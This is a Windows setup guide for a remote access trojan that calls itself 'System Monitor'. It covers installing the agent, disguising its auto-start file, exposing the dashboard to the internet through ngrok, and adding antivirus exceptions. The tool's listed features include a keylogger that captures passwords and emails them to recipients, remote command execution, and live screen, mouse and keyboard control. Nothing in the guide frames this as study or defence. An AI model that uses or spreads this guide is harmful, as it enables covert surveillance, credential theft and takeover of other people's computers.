# System Monitor - Windows Guide

## Quick Start (3 Steps)

### 1. Install Python
Download and install Python 3.8+ from https://www.python.org/downloads/
- ✅ Check "Add Python to PATH" during installation

### 2. Run Installer
Double-click `install_windows.bat` or run in Command Prompt:
```cmd
cd path\to\rat
install_windows.bat
```

### 3. Access Dashboard
Open browser: http://localhost:5000
- **Username:** admin
- **Password:** rat_admin_2024

## What's Included

✅ **Screen Capture** - Live desktop view  
✅ **Mouse Control** - Move and click  
✅ **Keyboard Input** - Type text remotely  
✅ **Auto-Start** - Runs on Windows login  
✅ **Keylogger** - Captures passwords  
✅ **Log Capture** - System logs every 5 minutes  
✅ **Command Execution** - Run commands remotely  

## Files

| File | Purpose |
|------|---------|
| `install_windows.bat` | One-step installer |
| `start_windows.bat` | Quick start (no install) |
| `rat_agent/agent.py` | Main agent |
| `dashboard/app.py` | Web dashboard |
| `requirements.txt` | Python packages |

## Installation Details

The installer:
1. Checks for Python 3.8+
2. Installs required packages:
   - flask, flask-socketio (web dashboard)
   - mss, pillow (screen capture)
   - pyautogui (mouse/keyboard control)
   - requests (email sending)
3. Creates startup shortcut
4. Starts all services

## Auto-Start

After installation, the agent starts automatically when you log in to Windows.

Location: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

To disable: Delete `System Monitor.vbs` from that folder.

## Running Manually

### Start
```cmd
start_windows.bat
```

Or manually:
```cmd
cd path\to\rat
python rat_agent\agent.py
python dashboard\app.py
```

### Stop
```cmd
taskkill /F /IM python.exe
```

Or close the command windows.

## Remote Access

To access from another device:

1. **Install ngrok** (or use any tunneling service)
2. **Run:** `ngrok http 5000`
3. **Share the URL** provided by ngrok

Example: https://your-url.ngrok-free.dev

## Features

### Remote Screen
- Navigate to "Remote Screen" in dashboard
- Click "Start Capture"
- **Click** on screen to click there
- **Drag** to move mouse
- **Fullscreen** for better view

### Commands
- Use quick command buttons
- Or type custom commands
- See output instantly

### Logs
- System logs captured every 5 minutes
- View and filter logs
- Sent to email recipients

### Keylogger
- Captures passwords and credentials
- View in dashboard
- Sent via email

## Configuration

Edit `rat_agent/config.py`:

```python
class Config:
    # Email settings
    SENDER_EMAIL = "your_email@gmail.com"
    DEFAULT_RECIPIENTS = ["recipient@example.com"]
    
    # Dashboard
    DASHBOARD_USERNAME = "admin"
    DASHBOARD_PASSWORD = "rat_admin_2024"
    
    # Log capture interval (seconds)
    LOG_CAPTURE_INTERVAL = 300  # 5 minutes
    
    # Keylogger
    KEYLOGGER_ENABLED = True
```

## Troubleshooting

### Python not found
```
[ERROR] Python not found
```
**Solution:** Install Python from python.org, check "Add to PATH"

### Package installation fails
```
[WARN] Some packages may have failed
```
**Solution:** Run manually:
```cmd
pip install flask flask-socketio mss pillow pyautogui
```

### Screen is black
**Solution:** 
- Ensure you're logged into desktop (not Remote Desktop)
- Try logging out and back in

### Mouse doesn't move
**Solution:**
```cmd
pip install --force-reinstall pyautogui
```

### Port 5000 in use
**Solution:** Change port in `rat_agent/config.py`:
```python
DASHBOARD_PORT = 5001
```

## Logs

View logs in:
- Agent: `%TEMP%\sysmon_agent.log`
- Dashboard: `%TEMP%\sysmon_dashboard.log`

Or check the command window output.

## Security

### Change Default Password
Edit `rat_agent/config.py`:
```python
DASHBOARD_PASSWORD = "your_secure_password"
```

### Firewall
Windows may prompt to allow Python through firewall. Click "Allow access".

### Antivirus
Some antivirus may flag the agent. Add exception for:
- `python.exe`
- `path\to\rat\` folder

## Network Access

### From Same Network
1. Find your IP: `ipconfig`
2. Access from other device: `http://YOUR_IP:5000`

### From Internet
Use ngrok:
```cmd
ngrok http 5000
```

Share the https:// URL provided.

## Uninstall

1. Stop the agent: `taskkill /F /IM python.exe`
2. Delete startup file: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System Monitor.vbs`
3. Delete the `rat` folder

## Comparison: Windows vs Linux

| Feature | Windows | Linux |
|---------|---------|-------|
| Screen capture | ✅ mss | ✅ mss |
| Mouse control | ✅ pyautogui | ✅ xdotool |
| Keyboard input | ✅ pyautogui | ✅ xdotool |
| Auto-start | ✅ Startup folder | ✅ cron/systemd |
| Keylogger | ⚠️ Limited | ✅ evdev |
| Install | ✅ .bat file | ✅ shell script |

Both platforms work great! Windows is actually easier for mouse/keyboard control.

## Tips

1. **Test locally first** - Access http://localhost:5000
2. **Change password** - Edit config.py
3. **Add recipients** - Use dashboard
4. **Use fullscreen** - Better for mobile control
5. **Check logs** - If something doesn't work

## Support

For issues:
1. Check logs in `%TEMP%`
2. Verify Python is in PATH: `python --version`
3. Re-run installer: `install_windows.bat`
4. Check requirements: `pip list`

## Summary

✅ Easy installation with `install_windows.bat`  
✅ Auto-starts on Windows login  
✅ Full remote control (screen, mouse, keyboard)  
✅ Access from any device via ngrok  
✅ Cross-platform with Linux/macOS  

**Get started:** Just run `install_windows.bat`!
